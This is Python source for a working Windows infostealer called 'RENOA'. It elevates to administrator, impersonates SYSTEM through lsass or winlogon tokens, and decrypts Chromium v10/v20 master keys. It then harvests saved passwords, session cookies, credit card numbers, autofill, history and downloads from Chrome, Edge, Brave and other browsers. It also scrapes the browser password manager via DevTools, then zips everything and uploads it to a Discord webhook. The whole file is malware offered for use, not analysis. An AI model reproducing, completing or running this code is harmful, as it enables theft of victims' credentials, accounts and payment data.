
import sys
import os
import io
import json
import base64
import struct
import shutil
import sqlite3
import zipfile
import tempfile
import ctypes
import time
import subprocess
import requests
import psutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES, ChaCha20_Poly1305

WEBHOOK_URL = "USE YOUR WEEBHOOK HERE" # use ur weebhook
OUT_DIR = os.path.join(tempfile.gettempdir(), "renoa-inf")

try:
    import websocket
    HAS_WS = True
except ImportError:
    HAS_WS = False
    print("[!] websocket-client missing, CDP password scrape disabled")



def _is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _elevate():
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{a}"' for a in sys.argv[1:])
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                            f'"{script}" {params}', None, 1)
        return True
    except Exception:
        return False


if not _is_admin():
    print("[*] RENOA")
    if _elevate():
        sys.exit(0)
    print("[!] run as administrator")
    sys.exit(1)


try:
    import win32crypt
    import win32security
    import win32api
    import win32con
except ImportError:
    print("[!] pip install pywin32")
    sys.exit(1)


LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stealer_output.txt")
_LOG = []


def log(msg):
    print(msg)
    _LOG.append(str(msg))


def save_log():
    try:
        with open(LOG_PATH, "w", encoding="utf-8") as f:
            f.write("\n".join(_LOG))
    except Exception:
        pass



def enable_debug_privilege():
    try:
        h = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
        luid = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        win32security.AdjustTokenPrivileges(h, False, [(luid, win32con.SE_PRIVILEGE_ENABLED)])
        return True
    except Exception as e:
        log(f"  [!] SeDebugPrivilege: {e}")
        return False


def dpapi_unprotect(data):
    try:
        return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
    except Exception as e:
        log(f"  [!] DPAPI: {e}")
        return None


def impersonate_system_start():
    if not enable_debug_privilege():
        return None
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    try:
        sys_pid = None
        for target in ("winlogon.exe", "services.exe", "lsass.exe"):
            for p in psutil.process_iter(attrs=["pid", "name"]):
                if (p.info.get("name") or "").lower() == target:
                    sys_pid = p.info["pid"]
                    break
            if sys_pid:
                break
        if not sys_pid:
            return None
        ph = None
        for access in (
            win32con.PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
            PROCESS_QUERY_LIMITED_INFORMATION,
            win32con.PROCESS_QUERY_INFORMATION,
        ):
            try:
                ph = win32api.OpenProcess(access, False, sys_pid)
                break
            except Exception:
                continue
        if not ph:
            return None
        th = win32security.OpenProcessToken(ph, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)
        dup = win32security.DuplicateTokenEx(th, win32security.SecurityImpersonation,
                                              win32con.MAXIMUM_ALLOWED, win32security.TokenImpersonation)
        win32security.SetThreadToken(None, dup)
        return True
    except Exception as e:
        log(f"  [!] impersonate: {e}")
        return None


def impersonate_end():
    try:
        win32security.SetThreadToken(None, None)
    except Exception:
        pass



def parse_blob(blob):
    try:
        b = io.BytesIO(blob)
        p = {}
        hl = struct.unpack('<I', b.read(4))[0]
        p['header'] = b.read(hl)
        cl = struct.unpack('<I', b.read(4))[0]
        if hl + cl + 8 != len(blob):
            return None
        p['flag'] = b.read(1)[0]
        if p['flag'] in (1, 2):
            p['iv'] = b.read(12)
            p['ct'] = b.read(32)
            p['tag'] = b.read(16)
        elif p['flag'] == 3:
            p['enc_aes'] = b.read(32)
            p['iv'] = b.read(12)
            p['ct'] = b.read(32)
            p['tag'] = b.read(16)
        else:
            p['raw'] = b.read()
        return p
    except Exception:
        return None


def decrypt_cng(encrypted, key_name):
    try:
        ncrypt = ctypes.windll.NCRYPT
        hProvider = ctypes.c_void_p()
        status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider),
                                                   "Microsoft Software Key Storage Provider", 0)
        if status != 0:
            return None
        hKey = ctypes.c_void_p()
        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
        if status != 0:
            ncrypt.NCryptFreeObject(hProvider)
            return None
        pcb = ctypes.c_ulong(0)
        ib = (ctypes.c_ubyte * len(encrypted)).from_buffer_copy(encrypted)
        status = ncrypt.NCryptDecrypt(hKey, ib, len(ib), None, None, 0, ctypes.byref(pcb), 0x40)
        if status != 0:
            ncrypt.NCryptFreeObject(hKey)
            ncrypt.NCryptFreeObject(hProvider)
            return None
        ob = (ctypes.c_ubyte * pcb.value)()
        status = ncrypt.NCryptDecrypt(hKey, ib, len(ib), None, ob, pcb.value, ctypes.byref(pcb), 0x40)
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        if status != 0:
            return None
        return bytes(ob[:pcb.value])
    except Exception:
        return None


def byte_xor(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])


def derive_v20(parsed, key_name):
    try:
        if parsed['flag'] == 1:
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            c = AES.new(aes_key, AES.MODE_GCM, nonce=parsed['iv'])
            return c.decrypt_and_verify(parsed['ct'], parsed['tag'])
        elif parsed['flag'] == 2:
            chacha = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            c = ChaCha20_Poly1305.new(key=chacha, nonce=parsed['iv'])
            return c.decrypt_and_verify(parsed['ct'], parsed['tag'])
        elif parsed['flag'] == 3:
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            aes_key = decrypt_cng(parsed['enc_aes'], key_name)
            if not aes_key:
                return None
            xored = byte_xor(aes_key, xor_key)
            c = AES.new(xored, AES.MODE_GCM, nonce=parsed['iv'])
            return c.decrypt_and_verify(parsed['ct'], parsed['tag'])
        else:
            return parsed.get('raw', b'')
    except Exception as e:
        log(f"  [!] derive_v20: {e}")
        return None


def get_master_keys(local_state, key_name):
    if not os.path.isfile(local_state):
        return None, None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            j = json.load(f)
    except Exception:
        return None, None
    oc = j.get('os_crypt', {})
    v10 = None
    v20 = None

    if 'encrypted_key' in oc:
        try:
            kb = base64.b64decode(oc['encrypted_key'])[5:]
            v10 = dpapi_unprotect(kb)
            if v10:
                log(f"  [+] v10 key: {v10.hex()}")
        except Exception:
            pass

    if 'app_bound_encrypted_key' in oc:
        try:
            kb = base64.b64decode(oc['app_bound_encrypted_key'])[4:]
            state = impersonate_system_start()
            if state:
                try:
                    d1 = dpapi_unprotect(kb)
                finally:
                    impersonate_end()
                if d1:
                    d2 = dpapi_unprotect(d1)
                    if d2:
                        p = parse_blob(d2)
                        if p:
                            if p['flag'] not in (1, 2, 3):
                                v20 = d2[-32:]
                            else:
                                state = impersonate_system_start()
                                try:
                                    v20 = derive_v20(p, key_name)
                                finally:
                                    impersonate_end()
                            if v20:
                                log(f"  [+] v20 key: {v20.hex()}")
        except Exception as e:
            log(f"  [!] v20: {e}")
    return v10, v20



def decrypt_value(enc, v10, v20, is_password=False):
    if not enc:
        return None
    if isinstance(enc, str):
        enc = enc.encode('utf-8', errors='ignore')
    ver = enc[:3]
    key = None
    if ver in (b'v10', b'v11'):
        key = v10
    elif ver == b'v20':
        key = v20
    else:
        try:
            d = dpapi_unprotect(enc)
            if d:
                return d.decode('utf-8', errors='ignore')
        except Exception:
            pass
        return None
    if not key:
        return None
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=enc[3:15])
        plain = cipher.decrypt(enc[15:-16])
        if is_password:
            return plain.decode('utf-8', errors='ignore')
        if len(plain) > 32:
            return plain[32:].decode('utf-8', errors='ignore')
        return plain.decode('utf-8', errors='ignore')
    except Exception:
        return None



def copy_db_safe(path):
    if not os.path.isfile(path):
        return None
    tmp = os.path.join(tempfile.gettempdir(), f"fx_{os.getpid()}_{os.path.basename(path)}")
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    GENERIC_READ = 0x80000000
    FILE_SHARE_READ = 0x00000001
    FILE_SHARE_WRITE = 0x00000002
    FILE_SHARE_DELETE = 0x00000004
    OPEN_EXISTING = 3
    kernel32.CreateFileW.restype = ctypes.c_void_p
    kernel32.CreateFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
                                     ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p]
    kernel32.ReadFile.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong,
                                  ctypes.POINTER(ctypes.c_ulong), ctypes.c_void_p]
    kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

    h = kernel32.CreateFileW(path, GENERIC_READ,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             None, OPEN_EXISTING, 0, None)
    if not h or h == ctypes.c_void_p(-1).value:
        try:
            shutil.copy2(path, tmp)
            return tmp
        except Exception:
            return None
    try:
        buf = bytearray()
        chunk = ctypes.create_string_buffer(65536)
        br = ctypes.c_ulong(0)
        while True:
            ok = kernel32.ReadFile(h, chunk, 65536, ctypes.byref(br), None)
            if not ok or br.value == 0:
                break
            buf.extend(chunk.raw[:br.value])
        with open(tmp, 'wb') as f:
            f.write(buf)
        return tmp
    finally:
        kernel32.CloseHandle(h)


def filetime(ts):
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=ts)).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return str(ts)



def extract_cookies_raw(db_path, v10, v20):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        try:
            cur.execute("""SELECT host_key, name, path, CAST(encrypted_value AS BLOB),
                                  expires_utc, is_secure, is_httponly, samesite, priority
                           FROM cookies""")
            has_ext = True
        except Exception:
            cur.execute("""SELECT host_key, name, path, CAST(encrypted_value AS BLOB),
                                  expires_utc, is_secure, is_httponly
                           FROM cookies""")
            has_ext = False
        for row in cur.fetchall():
            if has_ext:
                host, name, path, enc, exp, sec, http, ss, pri = row
            else:
                host, name, path, enc, exp, sec, http = row
                ss, pri = 0, 1
            val = decrypt_value(enc, v10, v20, False)
            if not val:
                continue
            rows.append({
                "host": host, "name": name, "path": path, "value": val,
                "expires": exp, "secure": bool(sec), "httpOnly": bool(http),
                "sameSite": ss, "priority": pri,
            })
        conn.close()
    except Exception as e:
        log(f"  [!] cookies: {e}")
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows


def samesite_to_str(v):
    return {0: "no_restriction", 1: "lax", 2: "strict", -1: "unspecified"}.get(v, "unspecified")


def export_cookie_editor_json(cookies, out_path):
    out = []
    for c in cookies:
        host = c["host"]
        exp = c["expires"]
        if exp and exp > 0:
            try:
                unix_exp = (datetime(1601, 1, 1) + timedelta(microseconds=exp)).timestamp()
            except Exception:
                unix_exp = 0
        else:
            unix_exp = 0
        out.append({
            "domain": host, "expirationDate": unix_exp,
            "hostOnly": not host.startswith("."), "httpOnly": c["httpOnly"],
            "name": c["name"], "path": c["path"],
            "sameSite": samesite_to_str(c["sameSite"]),
            "secure": c["secure"], "session": not bool(exp),
            "storeId": "0", "value": c["value"], "id": len(out) + 1,
        })
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(out, f, indent=2, ensure_ascii=False)


def export_cookies_netscape(cookies, out_path):
    lines = ["# Netscape HTTP Cookie File", "", ""]
    for c in cookies:
        host = c["host"]
        include_sub = "TRUE" if host.startswith(".") else "FALSE"
        exp = c["expires"]
        if exp and exp > 0:
            try:
                unix_exp = int((datetime(1601, 1, 1) + timedelta(microseconds=exp)).timestamp())
            except Exception:
                unix_exp = 0
        else:
            unix_exp = 0
        lines.append(f"{host}\t{include_sub}\t{c['path']}\t{'TRUE' if c['secure'] else 'FALSE'}\t{unix_exp}\t{c['name']}\t{c['value']}")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def export_cookies_csv(cookies, out_path):
    with open(out_path, "w", encoding="utf-8", newline="") as f:
        f.write("domain,name,path,value,secure,httpOnly,expires,sameSite\n")
        for c in cookies:
            val = c["value"].replace('"', '""')
            f.write(f'{c["host"]},{c["name"]},{c["path"]},"{val}",{c["secure"]},{c["httpOnly"]},{c["expires"]},{samesite_to_str(c["sameSite"])}\n')



def extract_passwords(db_path, v10, v20):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return [], {"total": 0, "with_pw": 0, "empty": 0, "v10": 0, "v11": 0, "v20": 0, "legacy": 0}
    rows = []
    stats = {"total": 0, "with_pw": 0, "empty": 0, "v10": 0, "v11": 0, "v20": 0, "legacy": 0}
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB), date_created FROM logins")
        for url, user, enc, dc in cur.fetchall():
            stats["total"] += 1
            if not enc or len(enc) < 3:
                stats["empty"] += 1
                rows.append({"url": url, "username": user, "password": "", "created": filetime(dc), "note": "empty in DB"})
                continue
            ver = enc[:3]
            if ver == b'v10':
                stats["v10"] += 1
            elif ver == b'v11':
                stats["v11"] += 1
            elif ver == b'v20':
                stats["v20"] += 1
            else:
                stats["legacy"] += 1
            pw = decrypt_value(enc, v10, v20, True)
            if pw:
                stats["with_pw"] += 1
                rows.append({"url": url, "username": user, "password": pw, "created": filetime(dc)})
            else:
                stats["empty"] += 1
                rows.append({"url": url, "username": user, "password": "", "created": filetime(dc), "note": f"decrypt failed ({ver})"})
        conn.close()
    except Exception as e:
        log(f"  [!] pw: {e}")
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows, stats


def export_passwords_csv(passwords, out_path):
    with open(out_path, "w", encoding="utf-8", newline="") as f:
        f.write("name,url,username,password,note\n")
        for p in passwords:
            u = p["url"].replace('"', '""')
            un = p["username"].replace('"', '""')
            pw = p["password"].replace('"', '""')
            note = p.get("note", f"created {p['created']}")
            f.write(f'"{u}","{u}","{un}","{pw}","{note}"\n')


def export_passwords_json(passwords, out_path):
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(passwords, f, indent=2, ensure_ascii=False)


def export_passwords_txt(browser, profile, passwords, out_path):
    """Formati i lexueshëm: Browser Name / url / username / password / ****."""
    with open(out_path, "w", encoding="utf-8") as f:
        for p in passwords:
            if not p["password"]:
                continue
            f.write(f"Browser Name: {browser} ( {profile} )\n")
            f.write(f"url: {p['url']}\n")
            f.write(f"username: {p['username']}\n")
            f.write(f"password: {p['password']}\n")
            f.write("\n" + "*" * 24 + "\n\n")



def extract_cards(db_path, v10, v20):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) FROM credit_cards")
        for name, em, ey, enc in cur.fetchall():
            num = decrypt_value(enc, v10, v20, True)
            if not num and not name:
                continue
            rows.append({"name": name, "exp_month": em, "exp_year": ey, "number": num or ""})
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows


def extract_autofill(db_path):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT name, value FROM autofill")
        for n, v in cur.fetchall():
            if n and v:
                rows.append({"name": n, "value": v})
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows


def extract_history(db_path):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
        for u, t, vc, lvt in cur.fetchall():
            rows.append({"url": u, "title": t, "visits": vc, "last": filetime(lvt)})
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows


def extract_downloads(db_path):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
        for tu, tp, tb, st in cur.fetchall():
            rows.append({"from": tu, "path": tp, "size": tb, "time": filetime(st)})
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows



def cdp_password_manager_scrape(exe_path, user_data_dir, port):
    if not HAS_WS:
        return []
    profile_dir = user_data_dir
    temp_profile = None
    lock_file = os.path.join(profile_dir, "lockfile")
    use_temp = False
    try:
        if os.path.exists(lock_file):
            with open(lock_file, 'r+b') as f:
                pass
    except Exception:
        use_temp = True
    if use_temp:
        temp_profile = os.path.join(tempfile.gettempdir(), f"cdp_pw_{os.getpid()}")
        try:
            if os.path.isdir(temp_profile):
                shutil.rmtree(temp_profile, ignore_errors=True)
            shutil.copytree(profile_dir, temp_profile, ignore=shutil.ignore_patterns(
                "Cache", "Code Cache", "GPUCache", "ShaderCache", "Service Worker"))
            profile_dir = temp_profile
        except Exception:
            temp_profile = None
            profile_dir = user_data_dir
    try:
        proc = subprocess.Popen([
            exe_path,
            f"--remote-debugging-port={port}",
            f"--user-data-dir={profile_dir}",
            "--no-first-run", "--no-default-browser-check",
            "--disable-features=LockProfileCookieDatabase",
            "chrome://password-manager/passwords"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        log(f"  [!] CDP launch: {e}")
        return []
    for _ in range(30):
        try:
            r = requests.get(f"http://127.0.0.1:{port}/json/version", timeout=1)
            if r.status_code == 200:
                break
        except Exception:
            pass
        time.sleep(0.5)
    else:
        try: proc.terminate()
        except Exception: pass
        return []
    passwords = []
    try:
        tabs = requests.get(f"http://127.0.0.1:{port}/json", timeout=5).json()
        ws_url = None
        for t in tabs:
            if "password" in (t.get("url") or "").lower():
                ws_url = t.get("webSocketDebuggerUrl")
                break
        if not ws_url and tabs:
            ws_url = tabs[0].get("webSocketDebuggerUrl")
        if not ws_url:
            return []
        ws = websocket.create_connection(ws_url, timeout=30)
        msg_id = 0
        def call(method, params=None, await_promise=False):
            nonlocal msg_id
            msg_id += 1
            m = {"id": msg_id, "method": method}
            if params:
                m["params"] = params
            ws.send(json.dumps(m))
            while True:
                raw = ws.recv()
                d = json.loads(raw)
                if d.get("id") == msg_id:
                    return d
        call("Page.enable")
        call("Runtime.enable")
        time.sleep(3)
        js = r"""
        (async function(){
            var out = [];
            try {
                var items = document.querySelectorAll('password-list-item');
                for (var i = 0; i < items.length; i++) {
                    var el = items[i];
                    var sh = el.shadowRoot;
                    if (!sh) continue;
                    var btns = sh.querySelectorAll('cr-icon-button');
                    for (var b = 0; b < btns.length; b++) {
                        var lbl = btns[b].getAttribute('aria-label') || '';
                        if (lbl.toLowerCase().indexOf('show') >= 0 || lbl.toLowerCase().indexOf('shfaq') >= 0) {
                            btns[b].click();
                            await new Promise(r => setTimeout(r, 250));
                            break;
                        }
                    }
                    var txt = (sh.textContent || '').trim();
                    if (txt) out.push(txt);
                }
            } catch(e) { out.push('ERR:' + e.message); }
            return JSON.stringify(out);
        })();
        """
        res = call("Runtime.evaluate", {"expression": js, "returnByValue": True, "awaitPromise": True})
        val = res.get("result", {}).get("result", {}).get("value")
        if val:
            try:
                items = json.loads(val)
                for item in items:
                    if item and not item.startswith("ERR:"):
                        passwords.append(item)
            except Exception:
                pass
        ws.close()
    except Exception as e:
        log(f"  [!] CDP pw scrape: {e}")
    finally:
        try: proc.terminate()
        except Exception:
            try: proc.kill()
            except Exception: pass
        time.sleep(1)
        if temp_profile:
            try: shutil.rmtree(temp_profile, ignore_errors=True)
            except Exception: pass
    return passwords



def send_text(content, label=""):
    if not content:
        return
    max_len = 1800
    prefix = f"[{label}]\n" if label else ""
    full = prefix + content
    for i in range(0, len(full), max_len):
        try:
            requests.post(WEBHOOK_URL, json={"content": f"```\n{full[i:i+max_len]}\n```"}, timeout=20)
        except Exception as e:
            log(f"[!] discord: {e}")


def send_file(path, label=""):
    if not os.path.isfile(path):
        return
    try:
        with open(path, "rb") as f:
            r = requests.post(WEBHOOK_URL,
                              data={"content": f"[{label}]"},
                              files={"file": (os.path.basename(path), f)},
                              timeout=300)
        log(f"[i] upload {label}: {r.status_code}")
    except Exception as e:
        log(f"[!] upload: {e}")



def close_browsers():
    for name in ("chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe", "chromium.exe"):
        subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True)
    time.sleep(2)


def find_exe(name, base):
    pf = os.environ.get("PROGRAMFILES", r"C:\Program Files")
    pf86 = os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")
    candidates = {
        "Chrome": [os.path.join(pf, r"Google\Chrome\Application\chrome.exe"),
                   os.path.join(pf86, r"Google\Chrome\Application\chrome.exe")],
        "Edge": [os.path.join(pf, r"Microsoft\Edge\Application\msedge.exe"),
                 os.path.join(pf86, r"Microsoft\Edge\Application\msedge.exe")],
        "Brave": [os.path.join(pf, r"BraveSoftware\Brave-Browser\Application\brave.exe"),
                  os.path.join(pf86, r"BraveSoftware\Brave-Browser\Application\brave.exe")],
    }.get(name, [])
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


def process_browser(name, base, key_name, port_offset):
    if not os.path.isdir(base):
        log(f"[{name}] not found")
        return
    local_state = os.path.join(base, "Local State")
    log(f"\n[{name}] {local_state}")

    v10, v20 = get_master_keys(local_state, key_name)
    log(f"[{name}] v10={bool(v10)} v20={bool(v20)}")
    if not v10 and not v20:
        return

    profiles = ["Default"]
    for e in os.listdir(base):
        if e.startswith("Profile ") or e.startswith("Person "):
            profiles.append(e)

    for profile in profiles:
        pd = os.path.join(base, profile)
        if not os.path.isdir(pd):
            continue

        # STRUKTURA E DOSJEVE
        base_pw = os.path.join(OUT_DIR, "Passwords", name, profile)
        base_ck = os.path.join(OUT_DIR, "Cookies", name, profile)
        base_cd = os.path.join(OUT_DIR, "Cards", name, profile)
        base_af = os.path.join(OUT_DIR, "Autofill", name, profile)
        base_hs = os.path.join(OUT_DIR, "History", name, profile)
        base_dl = os.path.join(OUT_DIR, "Downloads", name, profile)
        for d in (base_pw, base_ck, base_cd, base_af, base_hs, base_dl):
            os.makedirs(d, exist_ok=True)

       
        ck_path = os.path.join(pd, "Network", "Cookies")
        if not os.path.isfile(ck_path):
            ck_path = os.path.join(pd, "Cookies")
        cookies = extract_cookies_raw(ck_path, v10, v20)
        if cookies:
            export_cookie_editor_json(cookies, os.path.join(base_ck, "cookies_cookieeditor.json"))
            export_cookies_netscape(cookies, os.path.join(base_ck, "cookies_netscape.txt"))
            export_cookies_csv(cookies, os.path.join(base_ck, "cookies.csv"))
            log(f"  [{profile}] cookies: {len(cookies)}")

        
        pws, stats = extract_passwords(os.path.join(pd, "Login Data"), v10, v20)
        if pws:
            export_passwords_csv(pws, os.path.join(base_pw, "passwords.csv"))
            export_passwords_json(pws, os.path.join(base_pw, "passwords.json"))
            export_passwords_txt(name, profile, pws, os.path.join(base_pw, "passwords.txt"))
            log(f"  [{profile}] passwords: {stats}")

        # CDP password manager scrape (Default only)
        if profile == "Default":
            exe_path = find_exe(name, base)
            if exe_path and HAS_WS:
                log(f"  [{name}] CDP password-manager scrape...")
                cdp_pws = cdp_password_manager_scrape(exe_path, base, 9300 + port_offset)
                if cdp_pws:
                    with open(os.path.join(base_pw, "passwords_chrome_manager.txt"), "w", encoding="utf-8") as f:
                        f.write("\n\n---\n\n".join(cdp_pws))
                    log(f"  [{name}] CDP rows: {len(cdp_pws)}")

      
        cds = extract_cards(os.path.join(pd, "Web Data"), v10, v20)
        if cds:
            with open(os.path.join(base_cd, "cards.json"), "w", encoding="utf-8") as f:
                json.dump(cds, f, indent=2, ensure_ascii=False)
            with open(os.path.join(base_cd, "cards.txt"), "w", encoding="utf-8") as f:
                for c in cds:
                    f.write(f"Cardholder: {c['name']}\n")
                    f.write(f"Number: {c['number']}\n")
                    f.write(f"Exp: {c['exp_month']}/{c['exp_year']}\n")
                    f.write("---\n")
            log(f"  [{profile}] cards: {len(cds)}")

        
        af = extract_autofill(os.path.join(pd, "Web Data"))
        if af:
            with open(os.path.join(base_af, "autofill.json"), "w", encoding="utf-8") as f:
                json.dump(af, f, indent=2, ensure_ascii=False)
            with open(os.path.join(base_af, "autofill.txt"), "w", encoding="utf-8") as f:
                for a in af:
                    f.write(f"{a['name']}: {a['value']}\n")
            log(f"  [{profile}] autofill: {len(af)}")

       
        hist_db = os.path.join(pd, "History")
        if os.path.isfile(hist_db):
            hist = extract_history(hist_db)
            if hist:
                with open(os.path.join(base_hs, "history.txt"), "w", encoding="utf-8", errors="ignore") as f:
                    for h in hist:
                        f.write(f"{h['url']} | {h['title']} | visits={h['visits']} | {h['last']}\n")
                log(f"  [{profile}] history: {len(hist)}")

            
            dl = extract_downloads(hist_db)
            if dl:
                with open(os.path.join(base_dl, "downloads.txt"), "w", encoding="utf-8", errors="ignore") as f:
                    for d in dl:
                        f.write(f"{d['path']}  <-  {d['from']}\n")
                log(f"  [{profile}] downloads: {len(dl)}")


def main():
    log("RENOA (structured ZIP) ===")
    log(f"Admin: {_is_admin()}")

    if os.path.isdir(OUT_DIR):
        shutil.rmtree(OUT_DIR, ignore_errors=True)
    os.makedirs(OUT_DIR, exist_ok=True)

    close_browsers()

    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")

    targets = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data"), "Google Chromekey1", 1),
        ("Chrome_Beta", os.path.join(local, "Google", "Chrome Beta", "User Data"), "Google Chromekey1", 2),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data"), "Microsoft Edgekey1", 3),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), "Brave Softwarekey1", 4),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data"), "Vivaldi Technologieskey1", 5),
        ("Chromium", os.path.join(local, "Chromium", "User Data"), "Google Chromekey1", 6),
    ]

    for name, base, key_name, offset in targets:
        try:
            process_browser(name, base, key_name, offset)
        except Exception as e:
            log(f"[!] {name}: {e}")

    
    sys_dir = os.path.join(OUT_DIR, "System")
    os.makedirs(sys_dir, exist_ok=True)
    with open(os.path.join(sys_dir, "system_info.txt"), "w", encoding="utf-8") as f:
        f.write(f"Hostname: {os.environ.get('COMPUTERNAME','?')}\n")
        f.write(f"Username: {os.environ.get('USERNAME','?')}\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"Admin: {_is_admin()}\n")

    zip_path = os.path.join(tempfile.gettempdir(),
                            f"stealer_{os.environ.get('COMPUTERNAME','pc')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(OUT_DIR):
            for f in files:
                fp = os.path.join(root, f)
                z.write(fp, os.path.relpath(fp, OUT_DIR))

    log(f"\n[i] ZIP: {zip_path} ({os.path.getsize(zip_path)} bytes)")
    send_file(zip_path, "renoa-stealer.zip")
    save_log()


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"[!] Fatal: {e}")
    finally:
        save_log()
        try:
            input("\npress enter to close...")
        except Exception:
            pass